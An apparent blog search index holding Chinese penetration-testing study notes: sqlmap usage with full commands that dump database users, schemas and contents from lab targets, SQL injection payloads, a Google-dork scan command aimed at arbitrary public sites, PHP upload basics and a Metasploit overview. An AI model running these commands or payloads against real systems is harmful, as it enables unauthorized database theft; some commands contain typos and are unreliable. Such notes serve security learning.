<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1 sqlmap工具详细使用 任务093：SQLMAP- 自动注入</title>
    <url>/2019/11/08/1%20sqlmapSQLMAP-%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>任务093：SQLMAP- 自动注入 笔记</p>
<h2 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a>sqlmap介绍</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>开源sql注入漏洞检测，利用<ul>
<li>检测动态页面中get/post参数,cookie,http头</li>
</ul>
</li>
<li>数据榨取<ul>
<li>文件访问               </li>
<li>操作系统命令执行                  </li>
<li>引擎强大，特性丰富</li>
<li>Xss漏洞检测</li>
</ul>
</li>
</ul>
<h3 id="五种漏洞检测技术"><a href="#五种漏洞检测技术" class="headerlink" title="五种漏洞检测技术"></a>五种漏洞检测技术</h3><ul>
<li><p>基于布尔的盲注检测</p>
<pre><code>  - ’ and 1=1 </code></pre>
<ul>
<li><p>基于时间的盲注检测基于错误的检测</p>
</li>
<li><p>’ and (select * from (select(sleep(20)))a)–+</p>
</li>
<li><p>基于UNION联合查询的检测</p>
<ul>
<li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li>
</ul>
</li>
<li><p>基于堆叠查询的检测</p>
<ul>
<li>;堆叠多个查询语句</li>
<li>适用于非select的数据修改、删除的操作</li>
</ul>
</li>
<li><p>支持的数据库管理系统DBMS<br>  MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,IBM DB2,SQLite,Firebird,Sybase,SAP MaxDB</p>
</li>
</ul>
</li>
</ul>
<h3 id="其他特性"><a href="#其他特性" class="headerlink" title="其他特性"></a>其他特性</h3><p>​        </p>
<ul>
<li>数据库直接连接-d与burpsuite、google结合使用，支持正则表达式限定测试目标<ul>
<li>不通过SQL注入，制定身份认证信息、P、端口</li>
</ul>
</li>
</ul>
<ul>
<li><p>Get、post、cookie、Referer、UserAgent (随机或指定)限速: 最大并发、延迟发送            </p>
<ul>
<li>Cookie过期后自动处理Set-Cookie头，更新cookie信息       </li>
</ul>
</li>
<li><p>支持Basic,Digest,NTLM,CA身份认证       </p>
</li>
<li><p>数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称 </p>
</li>
<li><p>文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表        </p>
</li>
<li><p>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</p>
</li>
</ul>
<h2 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">显示</span><br><span class="line">-h或是--help                   都是查看基本常用的参数</span><br><span class="line">    -hh                                  查看详细参数</span><br><span class="line">    -v                                    查看返回结果信息0-6，6是查看返回最详细信息0是最低。默认是1</span><br><span class="line">指定目标                                       </span><br><span class="line">    -d                                   直接连接数据库，当客户端来使用</span><br><span class="line">    -u     “URL地址”            定一个URL这个URL必须是带变量的像http:&#x2F;&#x2F;www.site.com&#x2F;vuln.php?id&#x3D;1</span><br><span class="line">     -l     文件                       导入一个文件可以来自Burp和WebScarab代理记录的文件</span><br><span class="line">    r-x    xxx.xml                   来自远程站点地图（.xml）文件的x站点地图url解析目标</span><br><span class="line">    -m   要指定的文件          多个目标URL保持到文件里-m就会用文件里的</span><br><span class="line">    -r     请求信息的文件      叫请求信息保存成一个文件-r就会读取文件里的请求信息进行注入探测</span><br><span class="line">    -g                                    用谷歌搜索引擎访问然后在进行扫描</span><br><span class="line">    -c     文件名                    叫要sqlmap执行的参数保存的到文件里-c就会用文件里的内容</span><br></pre></td></tr></table></figure>
<p>下面就用上面的参数进行演示<br>靶机metasploitable-linux-2.0.0里的phpMyAdmin里的靶机</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.52.205&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;admin&amp;password&#x3D;11&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot; -p username -f</span><br></pre></td></tr></table></figure>
<p>-p是要指定的变量名之对这个变量进行检查探测<br>-f是检查检查指纹信息<br>总体来说就是检查这个URL里的username进行指纹检查看见查</p>
<h3 id="查看读取数据库账号"><a href="#查看读取数据库账号" class="headerlink" title="查看读取数据库账号"></a>查看读取数据库账号</h3><p>命令 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.52.205&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;admin&amp;password&#x3D;11&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  -p username --usere</span><br></pre></td></tr></table></figure>
<pre><code>--usere是查看读取数据库账号</code></pre>
<h3 id="查看数据库的版本"><a href="#查看数据库的版本" class="headerlink" title="查看数据库的版本"></a>查看数据库的版本</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.52.205&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;admin&amp;password&#x3D;11&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  -p username --banner</span><br></pre></td></tr></table></figure>
<p>  –banner就是查看数据库的版本类型的</p>
<h3 id="查看你数据管理系统有多少库显示库名"><a href="#查看你数据管理系统有多少库显示库名" class="headerlink" title="查看你数据管理系统有多少库显示库名"></a>查看你数据管理系统有多少库显示库名</h3><p>命令 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.52.205&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;admin&amp;password&#x3D;11&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  -p username --dbs</span><br></pre></td></tr></table></figure>
<p>–dbs查看你数据管理系统有多少库显示库名</p>
<h3 id="查看原数据库"><a href="#查看原数据库" class="headerlink" title="查看原数据库"></a>查看原数据库</h3><p>　命令   </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.52.205&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;admin&amp;password&#x3D;11&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  -p username  --schema</span><br></pre></td></tr></table></figure>
<p>–schema查看原数据库 前提的有权限查询schema库的权限</p>
<h3 id="查看你所以的内容"><a href="#查看你所以的内容" class="headerlink" title="查看你所以的内容"></a>查看你所以的内容</h3><p>命令 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.52.205&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;admin&amp;password&#x3D;11&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  -p username  -a</span><br></pre></td></tr></table></figure>
<p> -a是查看你所以的内容</p>
<h3 id="直接连接数据库进行查询查询的更快，但是你得的数据库帐号密码-列：sqlmap-d-“mysql-帐号-密码-192-168-20-10-3306-dvwa”-a"><a href="#直接连接数据库进行查询查询的更快，但是你得的数据库帐号密码-列：sqlmap-d-“mysql-帐号-密码-192-168-20-10-3306-dvwa”-a" class="headerlink" title="直接连接数据库进行查询查询的更快，但是你得的数据库帐号密码 列：sqlmap -d “mysql://帐号:密码@192.168.20.10:3306/dvwa” -a"></a>直接连接数据库进行查询查询的更快，但是你得的数据库帐号密码 列：sqlmap -d “mysql://帐号:密码@192.168.20.10:3306/dvwa” -a</h3><p>　</p>
<p>　也可以用其他参数如–dbs了 </p>
<p>　靶机没有密码输入帐号直接就可以连接了</p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -d &quot;mysql:&#x2F;&#x2F;root:@172.16.103.128:3306&#x2F;dvwa&quot;  -a</span><br></pre></td></tr></table></figure>


<h3 id="扫描-google-搜索结果这个是需要翻墙的"><a href="#扫描-google-搜索结果这个是需要翻墙的" class="headerlink" title="扫描 google 搜索结果这个是需要翻墙的"></a>扫描 google 搜索结果这个是需要翻墙的</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -g &quot;inurl:\&quot;.php?id&#x3D;1\&quot;&quot;</span><br></pre></td></tr></table></figure>




<p>　-g就是用google 搜索结果</p>
<h3 id="用-url-列表文件进行扫描"><a href="#用-url-列表文件进行扫描" class="headerlink" title="用 url 列表文件进行扫描"></a>用 url 列表文件进行扫描</h3><p>　命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -m 文件名</span><br></pre></td></tr></table></figure>


<p>　-m是指定一个文件文件里存放多个url地址然后在进行文件里的多个url进行选择性扫描</p>
<h3 id="使用和请求文件和-POST文件方法进行扫描"><a href="#使用和请求文件和-POST文件方法进行扫描" class="headerlink" title="使用和请求文件和 POST文件方法进行扫描"></a>使用和请求文件和 POST文件方法进行扫描</h3><p>　用burp或者用其他工具进行抓取请求内容然后保存一个文件里</p>
<p>　帐号密码几乎都是用POST进行传输的很少用UIL进行传输url里没有传输帐号密码那么就在POST请求里</p>
<h4 id="使用http请求文件"><a href="#使用http请求文件" class="headerlink" title="使用http请求文件　"></a>使用http请求文件　</h4><p>这个后面可以跟参数的</p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqkmap -r 请求保存的文件 -a</span><br></pre></td></tr></table></figure>
<h4 id="使用burpsuite-log文件"><a href="#使用burpsuite-log文件" class="headerlink" title="使用burpsuite log文件"></a>使用burpsuite log文件</h4><p>用burp工具的请求的过程保存成一个log文件然后在用sqlmao读取log文件然后在漏洞的注入</p>
<p>　保存log文件<br>　<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191108103126992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>　<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019110810311672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -l a　</span><br></pre></td></tr></table></figure>
<p>扫描会非常长后面可以加参数</p>
<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https:&#x2F;&#x2F;1.1.1.1&#x2F;a.php?id&#x3D;1:8843&quot; --force-ssl</span><br></pre></td></tr></table></figure>
<h3 id="配置文件进行扫描"><a href="#配置文件进行扫描" class="headerlink" title="配置文件进行扫描"></a>配置文件进行扫描</h3><p>就是叫要扫描的URL保存到一个文件里然后sqlmap在读取文件里的URL里的目标地址进行扫描<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -c sqlmap.txt</span><br></pre></td></tr></table></figure>
















]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>1. 文件上发漏洞之php编写上传文件</title>
    <url>/2020/07/11/1.%20%E6%96%87%E4%BB%B6%E4%B8%8A%E5%8F%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="php-ini文件配置上传限制"><a href="#php-ini文件配置上传限制" class="headerlink" title="php.ini文件配置上传限制"></a>php.ini文件配置上传限制</h2><p>php.ini文件php7.4默认文件上传最大是2m<br>在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload_max_filesize&#x3D;要上传最大的文件</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200915095041.png"></p>
<p>上发最多默认是20</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">max_file_uploads &#x3D; 要可以连续发送几个</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200915100129.png"></p>
<h2 id="FILES上传参数"><a href="#FILES上传参数" class="headerlink" title="$_FILES上传参数"></a>$_FILES上传参数</h2><p>我们上发的文件都是用<code>$_FILES</code>来获得的里面有参数<br>用<code>print_r()</code>来查看一下<br>a.html代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上发<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;a.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>要上发的文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wj&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>a.php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    print_r($_FILES)</span><br></pre></td></tr></table></figure>
<p><code>$_FILES</code>是一个数组他保留这上传文件信息<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200915104245.png"><br>可以看见数组<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200915104345.png"><br>我们就可以单独的数组进行显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码0是就是没有报错</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称</span><br></pre></td></tr></table></figure>
<p>我们就可以写个a.php代码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传：&quot;</span> . $_FILES[<span class="string">&quot;wj&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;类型：&quot;</span>. $_FILES[<span class="string">&quot;wj&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;大小: &quot;</span>. $_FILES[<span class="string">&quot;wj&quot;</span>][<span class="string">&quot;size&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;报错代码：&quot;</span>. $_FILES[<span class="string">&quot;wj&quot;</span>][<span class="string">&quot;error&quot;</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;存储在: &quot;</span> . $_FILES[<span class="string">&quot;wj&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200915105324.png"></p>
<h3 id="文件移动"><a href="#文件移动" class="headerlink" title="文件移动"></a>文件移动</h3><p><code>move_uploaded_file()</code>函数<br>这个函数有两个参数</p>
<p>第一个猜数 必需。规定要移动的文件。</p>
<p>第二个参数 必需。规定文件的新位置。<br>a.html代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上发<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;a.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>要上发的文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;wj&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点击提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>a.php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a=<span class="string">&quot;C:\phpstudy_pro\WWW\sq\a.png&quot;</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&quot;wj&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],$a);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件在&quot;</span>.$a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200915113836.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200915113927.png"></p>
<h2 id="安全上发文件"><a href="#安全上发文件" class="headerlink" title="安全上发文件"></a>安全上发文件</h2><p><code>is_uploaded_file()</code>函数<br>里面有一个参数必填，是文件名<br>如果 file 所给出的文件是通过 HTTP POST 上传的则返回 TRUE。</p>
<p>该函数可以用于确保恶意的用户无法欺骗脚本去访问本不能访问的文件，例如 /etc/passwd。</p>
<p>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。<br>如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">is_uploaded_file($_FILES[<span class="string">&quot;wj&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
        <category>文件上发漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>1.Metasploit介绍和模块</title>
    <url>/2020/08/09/1.Metasploit%E4%BB%8B%E7%BB%8D%E5%92%8C%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="苑房弘课程"><a href="#苑房弘课程" class="headerlink" title="苑房弘课程"></a>苑房弘课程</h2><p><strong>学习msf的笔记</strong></p>
<p>Metasploit是一个非常强大的渗透测试框架</p>
<ul>
<li>2003年有HD Moore编写的，2007 年用 ruby 语言编写<ul>
<li>框架继承了渗透测试标准（PETS）标准</li>
<li>一定程度上统一了渗透测试研究的工作环境</li>
<li>新的攻击代码可以比较容易的加入框架</li>
</ul>
</li>
<li>开发活跃版本更新频繁<ul>
<li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li>
<li>目前分化为四个版本，社区版依然十分活跃</li>
<li>HD More说：为 Metasploit 写书是种自虐</li>
</ul>
</li>
</ul>
<p>2009年10月21号，漏洞管理解决公司Rapid7收购Metasploit项目</p>
<p><strong>Metasploit 有四个版本，默认kali linux 集成的是Metasploit  Framework版本</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408125335180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>Metasploit  Framework简称msf<br>下面我们就说Metasploit  Framework这个来介绍</p>
<ul>
<li>msf他使用的是 <strong>postgresql</strong> 数据库<ul>
<li>扫描下来得到的信息都保存到postgresql数据库数据库里</li>
</ul>
</li>
</ul>
<h2 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a>MSF架构</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408131408719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="1-Rex"><a href="#1-Rex" class="headerlink" title="1. Rex"></a>1. Rex</h2><ul>
<li>Rex是msf最基本依赖的库，<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理 socket 连接诶访问、协议应答（http/SSL/SMB 等）</li>
<li>编码转换（XOR、Base64、Unicode）<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408134155318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
</li>
</ul>
<h2 id="2-Msf-Core"><a href="#2-Msf-Core" class="headerlink" title="2.Msf::Core"></a>2.Msf::Core</h2><ul>
<li>他是提供 Metasploit的核心最底层的基本 API，是框架的核心能力实现库<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408133048148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h2 id="3-Msf-Base"><a href="#3-Msf-Base" class="headerlink" title="3. Msf::Base"></a>3. Msf::Base</h2><ul>
<li>提供友好的的 API 接口，便于模块调用的库<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020040813322836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h2 id="4-他的使用方法"><a href="#4-他的使用方法" class="headerlink" title="4. 他的使用方法"></a>4. 他的使用方法</h2><ul>
<li>比如有web的使用，有命令行的使用<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200408133637519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<h1 id="5-Plugin-插件-和目录结构"><a href="#5-Plugin-插件-和目录结构" class="headerlink" title="5. Plugin 插件 和目录结构"></a>5. Plugin 插件 和目录结构</h1><ul>
<li>连接和调用外部扩展功能和系统</li>
<li>他直接就可以调用其他的工具</li>
</ul>
<p><strong>5.1介绍目录结构</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409120706840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>modules</strong>：目录里面存放模块的<br><strong>plugins</strong>：目录里面存放插件的<br><strong>tools</strong>：目录里面存放其他的工具的<br><strong>scripts</strong>：目录里面存放辅助的脚本的<br><strong>db</strong>：数据库的放在这个目录里<br><strong>data</strong>：使用到的文件，比如密码字典<br><strong>lib</strong>：库文件都保持在这个目录里<br><strong>config</strong>：存放这配置文件在这个目录里<br>还有其他的文件都是执行的比如<strong>msfconsole</strong>就是生成木马的程序</p>
<p><strong>细说modules模块文件</strong></p>
<p>他的模块都放在<code>/usr/share/metasploit-framework/modules/</code>这个目录下<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409115811744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看一下目录，应为msf更新的比较快，我看的教程里面没有现在这个<strong>evasion</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409122015974.png" alt="在这里插入图片描述"></p>
<ol>
<li>auxiliary （辅助模块）<br>执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li>
<li>encoders （编码模块）<br>对病毒进行加密，躲避杀毒软件的查杀</li>
<li>exploits（漏洞利用模块）<br>利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
<li>nops（空指令模块）<br>空指令就是空操作，提高 paylaod 稳定性及维持大小</li>
<li>payloads（攻击载荷模块）<br>就是我们成功真正在目标系统进行执行的代码，比如bind shell和反弹shell等<br>里面还有三个目录<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409141541237.png" alt="在这里插入图片描述"><br>Stager：目标计算机内存有限时，先传输一个较小的 病毒用于建立连接<br>stages：利用 stager 建立的连接下载的后续病毒<br>stager、stages 都有多种类型，适用于不同场景</li>
</ol>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>1. 网易web安全渗透  手动sql注入</title>
    <url>/2020/08/10/1.%20%E7%BD%91%E6%98%93%E6%89%8B%E5%8A%A8sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ol>
<li>靶场环境搭建</li>
</ol>
<p>环境环境搭建服务器软件是phpstudy下载地址<a href="https://www.xp.cn/">https://www.xp.cn/</a><br>靶场是sqli-labs下载地址是<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>配置sqli-labs的sql密码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719151133673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p>用php5和mysql5.7<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071915101782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
